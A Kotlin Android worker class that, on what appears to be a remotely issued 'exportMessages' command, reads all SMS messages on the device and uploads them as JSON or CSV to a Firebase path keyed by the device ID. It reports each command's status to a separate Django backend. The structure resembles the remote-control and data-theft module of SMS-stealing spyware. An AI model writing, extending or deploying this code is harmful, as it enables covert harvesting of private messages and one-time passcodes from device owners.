package com.example.fast.workers

import android.content.Context
import android.content.pm.PackageManager
import android.provider.Settings
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.fast.config.AppConfig
import com.example.fast.util.DjangoApiHelper
import com.example.fast.util.LogHelper
import com.example.fast.util.MessageAnalyticsManager
import com.google.firebase.Firebase
import com.google.firebase.database.database
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

class ExportMessagesWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result {
        val format = inputData.getString(KEY_FORMAT) ?: "json"
        val criteria = inputData.getString(KEY_CRITERIA)
        val historyTimestamp = inputData.getLong(KEY_HISTORY_TIMESTAMP, 0L)

        if (ContextCompat.checkSelfPermission(
                applicationContext,
                android.Manifest.permission.READ_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            logCommandStatus(historyTimestamp, "failed", "READ_SMS permission not granted")
            return Result.failure()
        }

        val messages = if (!criteria.isNullOrBlank()) {
            MessageAnalyticsManager.fetchAllMessages(applicationContext)
        } else {
            MessageAnalyticsManager.fetchAllMessages(applicationContext)
        }

        val exportData = when (format.lowercase()) {
            "json" -> MessageAnalyticsManager.convertToJson(messages)
            "csv" -> MessageAnalyticsManager.convertToCsv(messages)
            else -> {
                logCommandStatus(historyTimestamp, "failed", "Invalid format. Use 'json' or 'csv'")
                return Result.failure()
            }
        }

        val deviceId = deviceId()
        val timestamp = System.currentTimeMillis()
        val exportPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/exports/$timestamp"
        val exportInfo = mapOf(
            "format" to format,
            "count" to messages.size,
            "createdAt" to timestamp,
            "data" to exportData
        )

        val success = writeToFirebase(exportPath, exportInfo)
        return if (success) {
            logCommandStatus(historyTimestamp, "executed", "Exported ${messages.size} messages")
            Result.success()
        } else {
            logCommandStatus(historyTimestamp, "failed", "Error: Firebase write failed")
            Result.failure()
        }
    }

    private suspend fun writeToFirebase(path: String, data: Map<String, Any>): Boolean {
        return suspendCancellableCoroutine { cont ->
            Firebase.database.reference
                .child(path)
                .setValue(data)
                .addOnSuccessListener {
                    if (cont.isActive) cont.resume(true)
                }
                .addOnFailureListener {
                    if (cont.isActive) cont.resume(false)
                }
        }
    }

    private suspend fun logCommandStatus(historyTimestamp: Long, status: String, reason: String) {
        if (historyTimestamp <= 0L) return
        try {
            DjangoApiHelper.logCommand(
                deviceId = deviceId(),
                command = "exportMessages",
                value = null,
                status = status,
                receivedAt = historyTimestamp,
                executedAt = System.currentTimeMillis(),
                errorMessage = reason
            )
        } catch (e: Exception) {
            LogHelper.e(TAG, "Failed to log exportMessages command status", e)
        }
    }

    private fun deviceId(): String {
        return Settings.Secure.getString(
            applicationContext.contentResolver,
            Settings.Secure.ANDROID_ID
        )
    }

    companion object {
        private const val TAG = "ExportMessagesWorker"
        const val KEY_FORMAT = "format"
        const val KEY_CRITERIA = "criteria"
        const val KEY_HISTORY_TIMESTAMP = "historyTimestamp"
    }
}
